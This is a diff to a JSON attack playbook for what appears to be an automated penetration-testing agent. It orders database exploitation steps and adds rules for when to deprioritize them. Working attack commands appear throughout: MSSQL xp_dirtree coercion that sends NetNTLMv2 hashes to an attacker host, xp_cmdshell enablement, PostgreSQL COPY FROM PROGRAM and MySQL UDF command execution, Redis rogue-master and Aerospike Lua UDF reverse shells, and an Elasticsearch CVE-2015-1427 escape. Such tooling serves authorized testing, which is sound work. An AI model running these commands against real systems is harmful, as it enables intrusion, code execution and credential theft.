@@ -33,11 +33,11 @@
       "commands": [
         {
           "tool": "mysql",
-          "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT version();'"
+          "run": "mysql -h {{target}} -u root --password= -e 'SHOW DATABASES;'"
         },
         {
           "tool": "mysql",
-          "run": "mysql -h {{target}} -u root --password= -e 'SHOW DATABASES;'"
+          "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e 'SELECT version();'"
         }
       ],
       "requires_all": []
@@ -80,7 +80,8 @@
       "tools": [
         "nxc",
         "mssqlclient.py",
-        "impacket-mssqlclient"
+        "impacket-mssqlclient",
+        "nmap"
       ],
       "requires_any": [
         "service.ms-sql-s",
@@ -125,6 +126,15 @@
           "tool": "nxc",
           "run": "nxc mssql {{target}} -u {{user}} -p '{{password}}' --local-auth -q \"EXEC master..xp_dirtree '\\\\{{lhost}}\\share'\"",
           "note": "MSSQL xp_dirtree coerced SMB auth using local/SQL authentication (--local-auth). Captures NetNTLMv2 hash of the MSSQL service account without domain account requirement."
+        },
+        {
+          "tool": "nmap",
+          "run": "nmap -Pn -sV -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password {{target}}",
+          "settled_by": [
+            "credential.available",
+            "db.session"
+          ],
+          "note": "Unauthenticated MSSQL discovery and empty-password check: pulls the SQL Server instance version, NTLM domain/hostname info, and tests for an empty sa password before you hold a credential."
         }
       ],
       "requires_all": []
@@ -137,6 +147,9 @@
       "tools": [
         "nxc",
         "mssqlclient.py"
+      ],
+      "os": [
+        "windows"
       ],
       "requires_all": [
         "db.session"
@@ -170,6 +183,9 @@
           "run": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
           "note": "Manual fallback from the interactive mssqlclient prompt: enable xp_cmdshell, then invoke it. Use when nxc's -x is blocked or you are already sitting in the SQL session."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.windows"
       ]
     },
     {
@@ -245,6 +261,9 @@
           "run": "psql -h {{target}} -U {{user}} -c \"DROP TABLE IF EXISTS x; CREATE TABLE x(o text); COPY x FROM PROGRAM 'id'; SELECT * FROM x;\"",
           "note": "The readable form: FROM PROGRAM captures command output into a table you then SELECT. `uid=...` is your foothold; swap id for a reverse shell and catch it with the listener card."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.linux"
       ]
     },
     {
@@ -435,6 +454,9 @@
           "run": "odat all -s {{target}} -d {{sid}} -U {{user}} -P {{password}}",
           "note": "Let odat probe every RCE and file path your account can reach, then use the one it reports as exploitable."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.linux"
       ]
     },
     {
@@ -524,7 +546,10 @@
           "note": "CVE-2015-1427 Groovy sandbox escape: the response embeds the command output. `uid=...` is the foothold; swap id for a reverse shell and catch it with the listener card."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "foothold.linux"
+      ]
     },
     {
       "id": "memcached-enum",
@@ -585,6 +610,9 @@
         "mssqlclient",
         "impacket"
       ],
+      "os": [
+        "windows"
+      ],
       "requires_all": [
         "db.session"
       ],
@@ -628,6 +656,9 @@
           "run": "EXEC ('EXEC sp_configure ''xp_cmdshell'',1;RECONFIGURE;EXEC xp_cmdshell ''whoami''') AT [LINKED]",
           "note": "On a sysadmin link, enable and run xp_cmdshell on the linked server for command execution on that host."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.windows"
       ]
     },
     {
@@ -682,6 +713,11 @@
           "run": "mysql -h {{target}} -u {{user}} -p{{password}} -e \"CREATE FUNCTION sys_exec RETURNING INT SONAME 'lib_mysqludf_sys.so'\"",
           "note": "UDF fallback when the web root is not writable: load the library, then SELECT sys_exec('id > /tmp/o')."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.webshell",
+        "foothold.linux",
+        "foothold.windows"
       ]
     },
     {
@@ -702,7 +738,8 @@
       ],
       "produces": [
         "credential.available",
-        "loot.credentials"
+        "credential.candidate",
+        "loot.material"
       ],
       "priority": 74,
       "autonomy": "approve",
@@ -774,7 +811,10 @@
           "note": "Executes rogue Redis master replication attack to upload module and execute interactive shell."
         }
       ],
-      "requires_all": []
+      "requires_all": [],
+      "deprioritize_when": [
+        "foothold.linux"
+      ]
     },
     {
       "id": "nosqli-regex-extract",
@@ -789,11 +829,13 @@
       "phase": "access",
       "requires_any": [
         "http.reachable",
-        "web.tech"
+        "web.tech",
+        "web.nosqli_confirmed"
       ],
       "produces": [
         "credential.available",
-        "loot.credentials"
+        "credential.candidate",
+        "loot.material"
       ],
       "priority": 76,
       "autonomy": "approve",
@@ -863,6 +905,9 @@
           "run": "curl -s -d \"language=en&driver=org.h2.Driver&url=jdbc:h2:mem:test_db&user=sa&password=\" 'http://{{target}}:8082/login.do'",
           "note": "Authenticate to exposed H2 Database Web Console port 8082 using default or identified database credentials."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.linux"
       ]
     },
     {
@@ -900,14 +945,19 @@
       "commands": [
         {
           "tool": "odat",
-          "run": "odat dbmsscheduler -s {{target}} -p 1521 -d {{oracle_sid}} -U {{user}} -P {{password}} --sysdba --exec \"cmd.exe /c {{command}}\"",
-          "note": "Execute operating system commands via Oracle DBMS_SCHEDULER package with administrative privileges."
+          "run": "odat sidguesser -s {{target}} -p 1521",
+          "note": "Enumerate active Oracle Database System Identifiers (SIDs) using dictionary and ping probes."
         },
         {
           "tool": "odat",
-          "run": "odat sidguesser -s {{target}} -p 1521",
-          "note": "Enumerate active Oracle Database System Identifiers (SIDs) using dictionary and ping probes."
+          "run": "odat dbmsscheduler -s {{target}} -p 1521 -d {{oracle_sid}} -U {{user}} -P {{password}} --sysdba --exec \"cmd.exe /c {{command}}\"",
+          "note": "Execute operating system commands via Oracle DBMS_SCHEDULER package with administrative privileges."
         }
+      ],
+      "deprioritize_when": [
+        "access.system",
+        "foothold.windows",
+        "access.admin"
       ]
     },
     {
@@ -955,6 +1005,9 @@
           "run": "python3 aerospike_UDF_RCE.py --ahost {{target}} --aport 3000 --lhost {{lhost}} --lport {{lport}}",
           "note": "Register malicious Lua UDF and execute reverse shell payload connecting back to Kali listener."
         }
+      ],
+      "deprioritize_when": [
+        "foothold.linux"
       ]
     },
     {
